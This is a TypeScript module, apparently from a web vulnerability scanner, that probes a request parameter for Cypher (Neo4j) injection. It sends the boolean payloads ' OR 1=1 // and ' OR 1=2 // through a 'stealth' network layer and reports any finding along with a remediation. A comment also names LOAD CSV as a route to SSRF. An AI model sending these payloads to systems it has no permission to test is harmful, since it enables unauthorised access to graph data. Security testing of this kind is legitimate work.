/**
 * SOHE God Rail v3 — Graph Query Attack Module
 *
 * Targets Cypher (Neo4j), Gremlin (TinkerPop), and SPARQL.
 * Exploits property graph traversal weaknesses.
 */

import { IAttackModule, ModuleExecutionResult } from './IAttackModule';
import { StrategyContext } from '../engine/StrategyPlanner';
import { GhostNetwork } from '../stealth/GhostNetwork';
import { AdaptiveResponseOracle } from '../engine/AdaptiveResponseOracle';
import { DataStoreIdentity } from '../DataStoreFingerprinter';

export class GraphQueryModule implements IAttackModule {
    name = 'Graph_Query_Injection_Module';
    description = 'Detects and exploits Cypher (Neo4j) and Gremlin graph injection.';

    shouldExecute(_ctx: StrategyContext, identity: DataStoreIdentity): boolean {
        return identity.type === 'Unknown' || ['Neo4j'].includes(identity.type);
    }

    async execute(
        ctx: StrategyContext, 
        network: GhostNetwork, 
        oracle: AdaptiveResponseOracle
    ): Promise<ModuleExecutionResult> {
        
        const result: ModuleExecutionResult = { findings: [], evidenceLogged: [] };
        
        // --- Cypher (Neo4j) Injection ---
        // Test 1: MATCH bypass OR
        const cypherTest = await this.testCypherInjection(ctx, network, oracle);
        if (cypherTest) {
             result.findings.push(cypherTest);
        } else {
             result.evidenceLogged.push("Cypher graph injection payloads (' OR 1=1 --) failed to alter traversal logic.");
        }

        // Test 2: Cypher LOAD CSV (OOB/SSRF)
        // If we can inject LOAD CSV, we have SSRF via the graph DB.
        
        return result;
    }

    private async testCypherInjection(
        ctx: StrategyContext, 
        network: GhostNetwork, 
        oracle: AdaptiveResponseOracle
    ) {
        // Cypher uses single quotes and // for comments
        // Example vulnerable query: MATCH (u:User {name: '${input}'}) RETURN u
        
        // Payload 1: ' OR 1=1 //
        const reqTrue = JSON.parse(JSON.stringify(ctx.baseRequest));
        const urlTrue = new URL(reqTrue.url);
        urlTrue.searchParams.set(ctx.parameterName, `${ctx.originalValue}' OR 1=1 //`);
        reqTrue.url = urlTrue.toString();

        // Payload 2: ' OR 1=2 //
        const reqFalse = JSON.parse(JSON.stringify(ctx.baseRequest));
        const urlFalse = new URL(reqFalse.url);
        urlFalse.searchParams.set(ctx.parameterName, `${ctx.originalValue}' OR 1=2 //`);
        reqFalse.url = urlFalse.toString();

        const resTrue = await network.executeRequest(reqTrue);
        const resFalse = await network.executeRequest(reqFalse);

        if (oracle.isTrue(resTrue).isTrue && !oracle.isTrue(resFalse).isTrue) {
            return {
                id: 'FND-Graph-Cypher',
                vulnerabilityType: 'Cypher Graph Injection (Neo4j)',
                severity: 'High' as any,
                confidence: 'Confirmed' as any,
                targetUrl: reqTrue.url,
                parameter: ctx.parameterName,
                payload: `' OR 1=1 //`,
                description: 'The parameter is vulnerable to Cypher query injection, allowing attackers to modify graph traversals and access unauthorized nodes.',
                impact: 'Data leakage of graph nodes and relationships.',
                remediation: 'Use Cypher query parameters (e.g., $paramName) instead of string concatenation.',
                evidence: [] 
            };
        }
        return null;
    }
}
